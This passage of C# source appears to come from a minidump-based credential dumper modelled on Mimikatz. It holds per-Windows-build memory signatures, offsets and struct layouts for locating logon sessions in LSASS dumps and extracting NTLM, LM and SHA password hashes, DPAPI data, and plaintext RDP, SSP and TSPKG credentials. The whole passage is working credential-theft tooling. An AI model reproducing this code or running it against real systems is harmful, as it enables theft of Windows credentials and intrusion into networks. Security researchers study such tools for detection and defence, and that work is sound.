            }
            else
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    //return lsaTemplate_NT5.get_template(sysinfo);
                    throw new Exception($"NT5 not yet supported");
                }
                else
                {
                    return lsaTemplate_NT6.get_template(sysinfo);
                }
            }
        }
    }
}
```

`Templates/msv_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class msv
    {
        public struct MsvTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public int LogonSessionListCountOffset;
            public int ListTypeSize;
            public int LocallyUniqueIdentifierOffset;
            public int LogonTypeOffset;
            public int SessionOffset;
            public int UserNameListOffset;
            public int DomainOffset;
            public int CredentialsOffset;
            public int pSidOffset;
            public int CredentialManagerOffset;
            public int LogonTimeOffset;
            public int LogonServerOffset;
            public int MSV1CredentialsOffset;
            public int MSV1PrimaryOffset;
            public int LogonDomainNameOffset;
            public int UserNameOffset;
            public int LmOwfPasswordOffset;
            public int NtOwfPasswordOffset;
            public int ShaOwPasswordOffset;
            public int DPAPIProtectedOffset;
            public Type PrimaryCredentialType;
            public Type list_entry;
            public Type credential_entry;
            public int PasswordOffset;
        }

        public static MsvTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            var template = new MsvTemplate();

            template.MSV1CredentialsOffset = FieldOffset<KIWI_MSV1_0_PRIMARY_CREDENTIALS>("Credentials");
            template.MSV1PrimaryOffset = FieldOffset<KIWI_MSV1_0_PRIMARY_CREDENTIALS>("Primary");
            template.PasswordOffset = 0;

            //identify credential session list structure to be used
            if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_51);
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_52);
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_60);
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
            {
                //do not do that :) //skelsec
                if (sysinfo.msv_dll_timestamp > 0x53480000)
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ);
                }
                else
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_61);
                }
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
            {
                //template.list_entry = PKIWI_MSV1_0_LIST_62
                Console.WriteLine(sysinfo.msv_dll_timestamp);
                if (sysinfo.msv_dll_timestamp > 0x53480000)
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_63);
                }
                else
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_62);
                }
            }
            else
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_63);
            }
            template.ListTypeSize = Marshal.SizeOf(template.list_entry);
            template.LocallyUniqueIdentifierOffset = StructFieldOffset(template.list_entry, "LocallyUniqueIdentifier");
            template.LogonTypeOffset = StructFieldOffset(template.list_entry, "LogonType");
            template.SessionOffset = StructFieldOffset(template.list_entry, "Session");
            template.UserNameListOffset = StructFieldOffset(template.list_entry, "UserName");
            template.DomainOffset = StructFieldOffset(template.list_entry, "Domain");
            template.CredentialsOffset = StructFieldOffset(template.list_entry, "Credentials");
            template.pSidOffset = StructFieldOffset(template.list_entry, "pSid");
            template.CredentialManagerOffset = StructFieldOffset(template.list_entry, "CredentialManager");
            template.LogonTimeOffset = StructFieldOffset(template.list_entry, "LogonTime");
            template.LogonServerOffset = StructFieldOffset(template.list_entry, "LogonServer");

            //
            if (sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL);
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1511)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10_OLD);
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10);
            }
            else
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607);
                template.PasswordOffset = -2;
            }

            template.LogonDomainNameOffset = StructFieldOffset(template.credential_entry, "LogonDomainName");
            template.UserNameOffset = StructFieldOffset(template.credential_entry, "UserName");
            template.LmOwfPasswordOffset = StructFieldOffset(template.credential_entry, "LmOwfPassword") + template.PasswordOffset;
            template.NtOwfPasswordOffset = StructFieldOffset(template.credential_entry, "NtOwfPassword") + template.PasswordOffset;
            template.ShaOwPasswordOffset = StructFieldOffset(template.credential_entry, "ShaOwPassword") + template.PasswordOffset;

            if (template.credential_entry != typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
            {
                template.DPAPIProtectedOffset = 0;
            }
            else
            {
                template.DPAPIProtectedOffset = FieldOffset<MSV1_0_PRIMARY_CREDENTIAL_10_1607>("DPAPIProtected");
            }

            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
                    template.first_entry_offset = -4;
                    template.LogonSessionListCountOffset = 0;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
                    template.first_entry_offset = -4;
                    template.LogonSessionListCountOffset = -45;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.signature = new byte[] { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
                    template.first_entry_offset = 21;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
                    template.first_entry_offset = 19;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
                    template.first_entry_offset = 36;
                    template.LogonSessionListCountOffset = -6;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1507 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1703)
                {
                    //1503 and 1603
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1703 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1803)
                {
                    //1703
                    template.signature = new byte[] { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1803 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1903)
                {
                    //1803
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
                else
                {
                    //1903
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84 };
                    template.first_entry_offset = 24;
                    template.LogonSessionListCountOffset = 0;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
                    template.first_entry_offset = -11;
                    template.LogonSessionListCountOffset = -43;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
                    template.first_entry_offset = -11;
                    template.LogonSessionListCountOffset = -42;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 18;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else
                {
                    throw new Exception($"Could not identify template! {sysinfo.BuildNumber}");
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }
            return template;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_MSV1_0_PRIMARY_CREDENTIALS
    {
        public long next;
        public UNICODE_STRING Primary;
        public UNICODE_STRING Credentials;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_MSV1_0_CREDENTIALS
    {
        public IntPtr next;
        public uint AuthenticationPackageId;
        public IntPtr PrimaryCredentials;
    }

    //KIWI_MSV1_0_LIST_XX
    public struct KIWI_MSV1_0_LIST_51
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public LUID LocallyUniqueIdentifier;
        public UNICODE_STRING UserName;
        public UNICODE_STRING Domain;
        public IntPtr unk0;
        public IntPtr unk1;
        public IntPtr pSid;
        public uint LogonType;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public ulong unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public IntPtr unk22;
        public ulong unk23;
        public IntPtr CredentialManager;
    }

    public struct KIWI_MSV1_0_LIST_52
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public LUID LocallyUniqueIdentifier;
        public UNICODE_STRING UserName;
        public UNICODE_STRING Domain;
        public IntPtr unk0;
        public IntPtr unk1;
        public IntPtr pSid;
        public uint LogonType;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public ulong unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public ulong unk22;
        public IntPtr CredentialManager;
    }

    public struct KIWI_MSV1_0_LIST_60
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public IntPtr unk0;
        public uint unk1;
        public IntPtr unk2;
        public uint unk3;
        public uint unk4;
        public uint unk5;
        public IntPtr hSemaphore6;
        public IntPtr unk7;
        public IntPtr hSemaphore8;
        public IntPtr unk9;
        public IntPtr unk10;
        public uint unk11;
        public uint unk12;
        public IntPtr unk13;
        public LUID LocallyUniqueIdentifier;
        public LUID SecondaryLocallyUniqueIdentifier;

        public UNICODE_STRING UserName;

        public UNICODE_STRING Domain;
        public IntPtr unk14;
        public IntPtr unk15;
        public IntPtr pSid;
        public uint LogonType;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public ulong unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public IntPtr unk22;
        public IntPtr CredentialManager;
    }

    public struct KIWI_MSV1_0_LIST_61
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public IntPtr unk0;
        public uint unk1;
        public IntPtr unk2;
        public uint unk3;
        public uint unk4;
        public uint unk5;
        public IntPtr hSemaphore6;
        public IntPtr unk7;
        public IntPtr hSemaphore8;
        public IntPtr unk9;
        public IntPtr unk10;
        public uint unk11;
        public uint unk12;
        public IntPtr unk13;
        public LUID LocallyUniqueIdentifier;
        public LUID SecondaryLocallyUniqueIdentifier;

        public UNICODE_STRING UserName;

        public UNICODE_STRING Domain;
        public IntPtr unk14;
        public IntPtr unk15;
        public IntPtr pSid;
        public uint LogonType;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public IntPtr unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public uint unk22;
        public IntPtr CredentialManager;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public IntPtr unk0;
        public uint unk1;
        public IntPtr unk2;
        public uint unk3;
        public uint unk4;
        public uint unk5;
        public IntPtr hSemaphore6;
        public IntPtr unk7;
        public IntPtr hSemaphore8;
        public IntPtr unk9;
        public IntPtr unk10;
        public uint unk11;
        public uint unk12;
        public IntPtr unk13;
        public LUID LocallyUniqueIdentifier;
        public LUID SecondaryLocallyUniqueIdentifier;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
        public byte[] waza;

        public UNICODE_STRING UserName;

        public UNICODE_STRING Domain;
        public IntPtr unk14;
        public IntPtr unk15;
        public IntPtr pSid;
        public uint LogonType;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public IntPtr unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public uint unk22;
        public IntPtr CredentialManager;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_MSV1_0_LIST_62
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public IntPtr unk0;
        public uint unk1;
        public IntPtr unk2;
        public uint unk3;
        public uint unk4;
        public uint unk5;
        public IntPtr hSemaphore6;
        public IntPtr unk7;
        public IntPtr hSemaphore8;
        public IntPtr unk9;
        public IntPtr unk10;
        public uint unk11;
        public uint unk12;
        public IntPtr unk13;
        public LUID LocallyUniqueIdentifier;
        public LUID SecondaryLocallyUniqueIdentifier;

        public UNICODE_STRING UserName;

        public UNICODE_STRING Domain;
        public IntPtr unk14;
        public IntPtr unk15;
        public UNICODE_STRING Type;
        public IntPtr pSid;
        public uint LogonType;
        public IntPtr unk18;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public IntPtr unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public uint unk22;
        public uint unk23;
        public uint unk24;
        public uint unk25;
        public uint unk26;
        public IntPtr unk27;
        public IntPtr unk28;
        public IntPtr unk29;
        public IntPtr CredentialManager;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_MSV1_0_LIST_63
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public IntPtr unk0;
        public uint unk1;
        public IntPtr unk2;
        public uint unk3;
        public uint unk4;
        public uint unk5;
        public IntPtr hSemaphore6;
        public IntPtr unk7;
        public IntPtr hSemaphore8;
        public IntPtr unk9;
        public IntPtr unk10;
        public uint unk11;
        public uint unk12;
        public IntPtr unk13;
        public LUID LocallyUniqueIdentifier;
        public LUID SecondaryLocallyUniqueIdentifier;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
        public byte[] waza;

        public UNICODE_STRING UserName;

        public UNICODE_STRING Domain;
        public IntPtr unk14;
        public IntPtr unk15;
        public UNICODE_STRING Type;
        public IntPtr pSid;
        public uint LogonType;
        public IntPtr unk18;
        public uint Session;
        public LARGE_INTEGER LogonTime;
        public UNICODE_STRING LogonServer;
        public IntPtr Credentials;
        public IntPtr unk19;
        public IntPtr unk20;
        public IntPtr unk21;
        public uint unk22;
        public uint unk23;
        public uint unk24;
        public uint unk25;
        public uint unk26;
        public IntPtr unk27;
        public IntPtr unk28;
        public IntPtr unk29;
        public IntPtr CredentialManager;
    }

    //KIWI_X_PRIMARY_CREDENTIAL
    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
    {
        public UNICODE_STRING Domain;
        public UNICODE_STRING UserName;
        public UNICODE_STRING Password;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSV1_0_PRIMARY_CREDENTIAL
    {
        private readonly UNICODE_STRING LogonDomainName;
        private readonly UNICODE_STRING UserName;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] NtOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] LmOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
        private readonly byte[] ShaOwPassword;

        private readonly byte isNtOwfPassword;
        private readonly byte isLmOwfPassword;
        private readonly byte isShaOwPassword;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
    {
        private readonly UNICODE_STRING LogonDomainName;
        private readonly UNICODE_STRING UserName;
        private readonly byte isIso;
        private readonly byte isNtOwfPassword;
        private readonly byte isLmOwfPassword;
        private readonly byte isShaOwPassword;
        private readonly byte align0;
        private readonly byte align1;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] NtOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] LmOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
        private readonly byte[] ShaOwPassword;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSV1_0_PRIMARY_CREDENTIAL_10
    {
        private readonly UNICODE_STRING LogonDomainName;
        private readonly UNICODE_STRING UserName;
        private readonly byte isIso;
        private readonly byte isNtOwfPassword;
        private readonly byte isLmOwfPassword;
        private readonly byte isShaOwPassword;
        private readonly byte align0;
        private readonly byte align1;
        private readonly byte align2;
        private readonly byte align3;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] NtOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] LmOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
        private readonly byte[] ShaOwPassword;

        /* buffer */
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
    {
        private readonly UNICODE_STRING LogonDomainName;
        private readonly UNICODE_STRING UserName;
        private readonly IntPtr pNtlmCredIsoInProc;
        private readonly byte isIso;
        private readonly byte isNtOwfPassword;
        private readonly byte isLmOwfPassword;
        private readonly byte isShaOwPassword;
        private readonly byte isDPAPIProtected;
        private readonly byte align0;
        private readonly byte align1;
        private readonly byte align2;

        private readonly uint unkD;
        private readonly ushort isoSize;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] DPAPIProtected;

        private readonly uint align3;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] NtOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
        private readonly byte[] LmOwfPassword;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
        private readonly byte[] ShaOwPassword;

        /* buffer */
    }
}
```

`Templates/rdp_templates.cs`:

```cs
using Minidump.Streams;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Minidump.Templates
{
    public class rdp
    {
        public struct RdpTemplate
        {
            public List<byte[]> signature;
            public int first_entry_offset;
            public object cred_struct;
        }

        public static RdpTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            RdpTemplate template = new RdpTemplate();

            if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsMinBuild.WIN_8)
            {
                List<byte[]> signatures = new List<byte[]>
                {
                    new byte[] {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47},
                    new byte[] {0x00, 0x00, 0x00, 0x00, 0xf3, 0x47},
                    new byte[] {0x00, 0x00, 0x00, 0x00, 0x3b, 0x01},
                };
                template.signature = signatures;
                template.first_entry_offset = 0;
                template.cred_struct = new WTS_KIWI();
            }
            else
            {
                List<byte[]> signatures = new List<byte[]>()
                {
                    new byte[] { 0xc8, 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00 }
                };
                template.signature = signatures;
                template.first_entry_offset = 16;
                template.cred_struct = new WTS_KIWI_2008R2();
            }
            return template;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WTS_KIWI
        {
            public uint unk0;
            public uint unk1;

            public ushort cbDomain;
            public ushort cbUsername;
            public ushort cbPassword;

            public uint unk2;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] Domain;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] UserName;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] Password;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WTS_KIWI_2008R2
        {
            public uint unk0;
            public uint unk1;

            public ushort cbDomain;
            public ushort cbUsername;
            public ushort cbPassword;

            public uint unk2;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] Domain;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] UserName;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] Password;
        }
    }
}
```

`Templates/ssp_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class ssp
    {
        public struct SspTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public KIWI_SSP_CREDENTIAL_LIST_ENTRY list_entry;
        }

        public static SspTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            var template = new SspTemplate();
            template.list_entry = new KIWI_SSP_CREDENTIAL_LIST_ENTRY();

            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
                    template.first_entry_offset = 16;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[]
                        {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
                    template.first_entry_offset = 20;
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
                    template.first_entry_offset = 14;
                }
                else
                {
                    //currently doesnt make sense, but keeping it here for future use
                    throw new Exception($"Unknown buildnumber! {sysinfo.BuildNumber}");
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                template.signature = new byte[] { 0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
                template.first_entry_offset = 12;
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }

            return template;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public UNICODE_STRING Domain;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Password;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_SSP_CREDENTIAL_LIST_ENTRY
        {
            public long Flink;
            public long Blink;
            public uint References;
            public uint CredentialReferences;
            public LUID LogonId;
            public uint unk0;
            public uint unk1;
            public uint unk2;
            public KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        };
    }
}
```

`Templates/tspkg_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class tspkg
    {
        public struct TspkgTemplate
        {
            public byte[] signature;
            public long avl_offset;
            public int TSCredTypeSize;
            public int TSCredLocallyUniqueIdentifierOffset;
            public int TSCredOffset;
        }

        public static TspkgTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            TspkgTemplate template = new TspkgTemplate();
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                template.signature = new byte[] { 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d };
                template.avl_offset = 7;
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL>("pTsPrimary");
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL_1607());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("pTsPrimary");
                }
                else
                {
                    //currently doesnt make sense, but keeping it here for future use
                    throw new Exception($"Unknown buildnumber! {sysinfo.BuildNumber}");
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe };
                    template.avl_offset = 8;
                    template.TSCredTypeSize = Marshal.SizeOf(new KIWI_TS_CREDENTIAL_1607());
                    template.TSCredLocallyUniqueIdentifierOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("LocallyUniqueIdentifier");
                    template.TSCredOffset = FieldOffset<KIWI_TS_CREDENTIAL_1607>("pTsPrimary");
                }
